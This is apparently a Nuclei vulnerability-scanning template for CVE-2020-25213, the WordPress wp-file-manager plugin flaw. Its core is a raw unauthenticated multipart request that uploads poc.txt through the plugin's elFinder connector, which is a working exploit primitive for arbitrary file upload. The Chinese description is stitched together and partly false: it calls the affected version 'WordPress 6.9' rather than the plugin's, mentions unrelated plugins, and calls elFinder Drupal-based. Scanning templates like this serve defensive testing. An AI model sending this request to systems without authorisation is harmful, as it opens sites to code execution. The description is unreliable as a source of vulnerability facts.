id: CVE-2020-25213
info:
  name: WordPress File Manager Plugin Remote Code Execution
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - wordpress
  - rce
  description: |-
    WorpPress Plugin wp-file-manager 任意文件上传漏洞
    WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。ghost是使用在其中的一个用于导入/导出WordPress数据的插件。relevant是使用在其中的一个相关内容显示插件。File Upload是使用在其中的一个文件上传插件。PHP是共同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。elFinder是一套基于Drupal平台的、开源的AJAX文件管理器。该产品提供多文件上传、图像缩放等功能。

    WordPress 6.9版本之前存在安全漏洞，该漏洞文件管理器（wp-file-manager）插件允许远程攻击者上传和执行任意PHP代码。攻击者可利用该漏洞执行任意代码。
  reference:
  - https://plugins.trac.wordpress.org/changeset/2373068
  - https://github.com/w4fz5uck5/wp-file-manager-0day
  - https://nvd.nist.gov/vuln/detail/cve-2020-25213
  severity: critical
  classification:
    cve-id:
    - cve-2020-25213
    cwe-id:
    - cwe-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案:
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://wordpress.org/plugins/wp-file-manager/#developers
requests:
- matchers:
  - type: word
    condition: and
    words:
    - poc.txt
    - added
  - type: word
    part: header
    words:
    - application/json
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48

    --------------------------ca81ac1fececda48
    Content-Disposition: form-data; name="reqid"

    17457a1fe6959
    --------------------------ca81ac1fececda48
    Content-Disposition: form-data; name="cmd"

    upload
    --------------------------ca81ac1fececda48
    Content-Disposition: form-data; name="target"

    l1_Lw
    --------------------------ca81ac1fececda48
    Content-Disposition: form-data; name="mtime[]"

    1576045135
    --------------------------ca81ac1fececda48
    Content-Disposition: form-data; name="upload[]"; filename="poc.txt"
    Content-Type: text/plain

    poc-test
    --------------------------ca81ac1fececda48--
